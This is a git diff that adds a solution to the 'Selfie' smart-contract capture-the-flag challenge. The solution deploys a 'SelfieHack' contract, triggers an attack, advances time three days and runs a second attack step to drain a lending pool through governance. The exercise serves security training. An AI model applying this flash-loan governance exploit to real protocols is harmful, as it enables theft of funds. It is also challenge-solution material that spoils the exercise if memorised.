@@ -11,7 +11,7 @@ You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal
  */
 describe("[Challenge] Selfie", function () {
   let deployer, player;
-  let token, governance, pool;
+  let token, governance, pool, selfieHack;
 
   const TOKEN_INITIAL_SUPPLY = 2000000n * 10n ** 18n;
   const TOKENS_IN_POOL = 1500000n * 10n ** 18n;
@@ -48,6 +48,12 @@ describe("[Challenge] Selfie", function () {
 
   it("Execution", async function () {
     /** CODE YOUR SOLUTION HERE */
+    hack = await (
+      await ethers.getContractFactory("SelfieHack", player)
+    ).deploy(token.address, pool.address, governance.address);
+    await hack.attack();
+    await time.increase(time.duration.days(3));
+    await hack.attack2();
   });
 
   after(async function () {
